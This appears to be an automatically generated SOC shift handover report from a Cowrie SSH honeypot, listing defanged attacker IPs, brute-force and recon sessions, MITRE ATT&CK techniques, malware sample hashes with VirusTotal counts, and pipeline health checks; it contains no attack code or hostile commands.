**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 23:03:01` | `cowrie.session.connect` |
| `2026-06-04 23:03:01` | `cowrie.client.version` |
| `2026-06-04 23:03:01` | `cowrie.client.kex` |
| `2026-06-04 23:03:02` | `cowrie.login.success` |
| `2026-06-04 23:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.220.171[.]40` to AbuseIPDB if not already reported
- [ ] Block `68.220.171[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `189.8.5[.]118` | **30** | 2026-06-04 21:09 | 2026-06-04 22:16 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.66.156[.]214` | **25** | 2026-06-04 20:10 | 2026-06-04 22:57 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.127[.]233` | **18** | 2026-06-04 20:11 | 2026-06-04 20:35 | 30m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `66.85.30[.]4` | **4** | 2026-06-04 21:24 | 2026-06-04 21:30 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `88.167.141[.]68` | **3** | 2026-06-04 20:53 | 2026-06-04 20:57 | 6m | 0 | `T1592` | 🟢 LOW |
| `182.44.116[.]87` | **2** | 2026-06-04 21:17 | 2026-06-04 21:19 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.136[.]87` | **2** | 2026-06-04 21:15 | 2026-06-04 21:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.81.140[.]174` | **2** | 2026-06-04 21:05 | 2026-06-04 21:20 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.78.1[.]33` | 1 | 2026-06-04 23:08 | 2026-06-04 23:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.29.110[.]90` | 1 | 2026-06-04 21:16 | 2026-06-04 21:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.230.168[.]213` | 1 | 2026-06-04 21:03 | 2026-06-04 21:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.157.10[.]33` | 1 | 2026-06-04 22:23 | 2026-06-04 22:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `163.7.4[.]169` | 1 | 2026-06-04 23:02 | 2026-06-04 23:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.73.148[.]23` | 1 | 2026-06-04 23:10 | 2026-06-04 23:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.165.62[.]10` | 1 | 2026-06-04 21:06 | 2026-06-04 21:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.242.111[.]161` | 1 | 2026-06-04 22:47 | 2026-06-04 22:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `58.186.20[.]143` | 1 | 2026-06-04 20:18 | 2026-06-04 20:18 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `68.220.171[.]40` | 1 | 2026-06-04 23:02 | 2026-06-04 23:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.219.165[.]42` | 1 | 2026-06-04 21:56 | 2026-06-04 21:56 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.66.156[.]214` | US | Enzu cloud and colocation services | **100** ⚠️ | 1 |
| `116.230.168[.]213` | CN | CHINANET Shanghai province network | **100** ⚠️ | 35 |
| `8.219.165[.]42` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 32 |
| `189.8.5[.]118` | BR | Universal Telecom S.A. | **100** ⚠️ | 20 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `66.85.30[.]4` | CA | Idigital Internet Inc. | **100** ⚠️ | 21 |
| `58.186.20[.]143` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `112.29.110[.]90` | CN | China Mobile Communications Corporation | **100** ⚠️ | 21 |
| `47.242.111[.]161` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 31 |
| `68.220.171[.]40` | US | Microsoft Corporation | **100** ⚠️ | 39 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 80 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 129 cases |
| Tool 34  | Credential Extractor        | ✅ 69 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (3.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 19 recon entry/entries in table (8 group(s) consolidating 86 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-04T23:12:35Z_
